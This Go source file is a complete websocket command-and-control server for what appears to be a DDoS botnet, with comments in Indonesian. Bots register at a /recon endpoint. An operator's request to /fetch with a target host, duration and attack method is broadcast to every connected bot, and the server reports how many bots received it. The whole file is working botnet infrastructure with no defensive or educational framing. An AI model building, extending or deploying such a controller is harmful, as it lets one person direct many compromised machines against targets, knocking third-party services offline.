package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"sync"

	"github.com/gorilla/websocket"
)

// Command yang dikirim ke bot
type Command struct {
	Host     string `json:"host"`
	Duration string `json:"duration"`
	Method   string `json:"method"`
}

// Hub menyimpan semua koneksi bot yang aktif
type Hub struct {
	mu   sync.Mutex
	bots map[*websocket.Conn]struct{}
}

func newHub() *Hub {
	return &Hub{bots: make(map[*websocket.Conn]struct{})}
}

func (h *Hub) add(conn *websocket.Conn) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.bots[conn] = struct{}{}
	log.Printf("bot connected, total: %d", len(h.bots))
}

func (h *Hub) remove(conn *websocket.Conn) {
	h.mu.Lock()
	defer h.mu.Unlock()
	delete(h.bots, conn)
	log.Printf("bot disconnected, total: %d", len(h.bots))
}

func (h *Hub) broadcast(cmd Command) int {
	h.mu.Lock()
	defer h.mu.Unlock()
	sent := 0
	for conn := range h.bots {
		if err := conn.WriteJSON(cmd); err != nil {
			log.Printf("failed to send to bot: %v", err)
			conn.Close()
			delete(h.bots, conn)
			continue
		}
		sent++
	}
	return sent
}

func (h *Hub) count() int {
	h.mu.Lock()
	defer h.mu.Unlock()
	return len(h.bots)
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// /recon — bot menyambung ke sini
func reconHandler(hub *Hub) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Printf("upgrade error: %v", err)
			return
		}
		hub.add(conn)
		defer func() {
			hub.remove(conn)
			conn.Close()
		}()

		// Baca pesan dari bot (keep-alive / ping), block sampai disconnect
		for {
			if _, _, err := conn.ReadMessage(); err != nil {
				break
			}
		}
	}
}

// /fetch — user memanggil ini untuk kirim perintah ke semua bot
func fetchHandler(hub *Hub) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()
		host := q.Get("host")
		duration := q.Get("duration")
		method := q.Get("method")

		if host == "" || duration == "" || method == "" {
			http.Error(w, "missing required query parameters", http.StatusBadRequest)
			return
		}

		cmd := Command{
			Host:     host,
			Duration: duration,
			Method:   method,
		}

		sent := hub.broadcast(cmd)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"host":      host,
			"duration":  duration,
			"method":    method,
			"bots_sent": sent,
			"bots_online": hub.count(),
		})

		log.Printf("command dispatched to %d bot(s): host=%s duration=%s method=%s", sent, host, duration, method)
	}
}

func main() {
	port := flag.String("p", "", "port to listen on (required)")
	flag.Parse()

	if *port == "" {
		log.Fatal("port is required: use -p <port>")
	}

	hub := newHub()

	http.HandleFunc("/recon", reconHandler(hub))
	http.HandleFunc("/fetch", fetchHandler(hub))

	addr := fmt.Sprintf(":%s", *port)
	log.Printf("starting server on %s", addr)
	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("server error: %v", err)
	}
}
